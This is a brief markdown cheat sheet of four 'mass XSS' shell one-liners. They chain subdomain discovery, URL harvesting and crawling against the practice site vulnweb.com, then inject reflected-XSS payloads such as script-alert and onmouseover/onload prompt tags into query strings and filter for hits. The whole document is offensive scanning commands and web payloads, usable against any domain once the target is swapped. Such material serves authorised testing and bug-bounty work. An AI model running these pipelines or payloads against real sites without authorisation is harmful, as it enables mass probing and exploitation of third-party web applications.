# Mass XSS OneLiners
- Dalfox XSS<br>
`subfinder -d vulnweb.com | httpx | katana -ps | gf xss | qsreplace | anew | dalfox pipe --skip-bav`
- AiriXSS Oneline<br>
`echo vulnweb.com | assetfinder --subs-only | httpx --silent | waybackurls | qsreplace '@x.y"><xss onmouSEOver=prompt(1337)>' | airixss -p 'prompt(1337)' | grep -v 'Not'`
- Freq XSS<br>
`echo vulnweb.com | assetfinder --subs-only | httpx --silent | waybackurls | gf xss | qsreplace '"><script>alert(1)</script>' | freq | grep -v 'Not'`
- Crawling XSS<br>
`echo vulnweb.com | assetfinder --subs-only | httpx --silent -t 95 | katana -xhr -jc -fx -kf all --silent | grep '?' | anew | qsreplace '"><html/onLOAD=prompt(7*7)>' | airixss -p 'onLOAD=prompt(7*7)>' | grep -v 'Not'`
